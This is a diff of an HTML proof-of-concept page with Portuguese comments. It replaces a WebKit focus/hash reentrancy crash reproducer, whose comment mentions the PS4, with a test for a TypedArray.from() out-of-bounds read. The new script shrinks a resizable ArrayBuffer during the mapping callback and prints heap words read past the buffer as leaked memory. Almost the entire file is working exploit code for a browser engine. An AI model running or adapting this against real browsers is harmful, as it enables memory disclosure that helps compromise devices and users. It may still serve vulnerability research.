@@ -1,74 +1,108 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<style>
-  /* 1. Estilo original + Forçamento de camada de composição assíncrona (simula AsyncFrameScrolling) */
-  iframe {
-    content: url();
-    zoom: 0.01;
-    width: 20px;
-    height: 20px;
-    border: none;
-    overflow: scroll;
-    -webkit-overflow-scrolling: touch;
-    transform: translateZ(0);
-    will-change: transform, scroll-position;
-  }
-
-  /* Área editável para simular o estado do Caret Browsing */
-  .caret-target {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    opacity: 0.01;
-  }
-</style>
+    <meta charset="utf-8">
+    <title>WebKit Bug 312513 - OOB Read Test</title>
+    <style>
+        body {
+            font-family: monospace;
+            background-color: #111;
+            color: #eee;
+            padding: 20px;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+        .pass { color: #4caf50; }
+        .fail { color: #f44336; }
+        .info { color: #2196f3; }
+        pre {
+            background-color: #222;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #333;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+    </style>
 </head>
 <body>
+    <h2>WebKit Bug 312513 - TypedArray.from() OOB Read Verification</h2>
+    <div id="log"></div>
 
-<div id="x" class="caret-target" contenteditable="true">x</div>
-<div id="y" class="caret-target" contenteditable="true">y</div>
+    <script>
+        const logDiv = document.getElementById('log');
 
-<iframe id="i0"></iframe>
+        function print(msg, className = '') {
+            const el = document.createElement('div');
+            if (className) el.className = className;
+            el.textContent = msg;
+            logDiv.appendChild(el);
+        }
 
-<script>
-  // Helper para mover o cursor/caret ativamente (simula Caret Browsing)
-  function moveCaretTo(elemId) {
-    const el = document.getElementById(elemId);
-    if (el) {
-      el.focus();
-      const sel = window.getSelection();
-      const range = document.createRange();
-      range.selectNodeContents(el);
-      range.collapse(false);
-      sel.removeAllRanges();
-      sel.addRange(range);
-    }
-  }
+        function runTest() {
+            try {
+                if (typeof ArrayBuffer.prototype.resize !== 'function') {
+                    print("[- ] Resizable ArrayBuffer não é suportado neste ambiente.", "fail");
+                    return;
+                }
 
-  onload = () => {
-    // 1. Injeta o frameset na raiz (idêntico ao teste original)
-    document.documentElement.append(document.createElement('frameset'));
+                const initialElements = 1024;
+                const bytesPerElement = 4;
+                const initialBytes = initialElements * bytesPerElement; // 4096 bytes
+                const shrinkElements = 4;
+                const shrinkBytes = shrinkElements * bytesPerElement;   // 16 bytes
 
-    const i0 = document.getElementById('i0');
+                const resizableBuffer = new ArrayBuffer(initialBytes, { maxByteLength: initialBytes * 4 });
+                const source = new Uint32Array(resizableBuffer);
+                source[Symbol.iterator] = null; // Força o TypedArray.from() a usar o caminho de indexação direta
 
-    // 2. Listener do foco no iframe com troca de hash e manipulação ativa de Caret
-    i0.onfocus = () => {
-      moveCaretTo('y');
-      location.hash = 'y'; // Aciona o loop de reentrância do PS4
-    };
+                // Preenche o buffer com um padrão de teste identificável
+                source.fill(0x41414141);
 
-    // 3. Ponto de partida
-    moveCaretTo('x');
-    location.hash = 'x';
+                let callbackCount = 0;
 
-    // 4. Injeção assíncrona via Cache API (idêntico ao teste original)
-    let s0 = document.createElement('script');
-    s0.src = `data:text/javascript,caches.has('a').then(() => i0.focus());`;
-    document.head.append(s0);
-  };
-</script>
+                print("[*] Iniciando TypedArray.from() e encolhendo o buffer no callback 0...", "info");
 
+                const result = Uint32Array.from(source, (val, index) => {
+                    if (index === 0) {
+                        // Reduz o buffer para apenas 4 elementos
+                        resizableBuffer.resize(shrinkBytes);
+                    }
+                    callbackCount++;
+                    return val;
+                });
+
+                print(`[*] Total de callbacks executados: ${callbackCount} (Esperado <= ${shrinkElements})`, "info");
+
+                if (callbackCount > shrinkElements) {
+                    print(`[+] VULNERÁVEL: O loop iterou ${callbackCount - shrinkElements} vezes fora dos limites!`, "fail");
+                    
+                    let leakedEntries = [];
+                    for (let i = shrinkElements; i < result.length; i++) {
+                        if (result[i] !== 0x41414141) {
+                            leakedEntries.push(`[+${i.toString().padStart(4, '0')}] 0x${result[i].toString(16).padStart(8, '0')}`);
+                        }
+                    }
+
+                    if (leakedEntries.length > 0) {
+                        print(`[+] Vazamento de memória detectado (${leakedEntries.length} palavras lidas da Heap):`, "fail");
+                        const pre = document.createElement('pre');
+                        pre.textContent = leakedEntries.slice(0, 30).join('\n') + (leakedEntries.length > 30 ? '\n... (truncado)' : '');
+                        logDiv.appendChild(pre);
+                    } else {
+                        print("[*] Leitura OOB ocorreu, mas os slots continham o padrão preenchido ou memória zerada.", "info");
+                    }
+                } else {
+                    print("[-] CORRIGIDO / NÃO VULNERÁVEL: A iteração foi interrompida nos limites.", "pass");
+                }
+
+            } catch (err) {
+                print(`[!] Erro durante o teste: ${err.message}`, "fail");
+            }
+        }
+
+        window.onload = runTest;
+    </script>
 </body>
 </html>
+
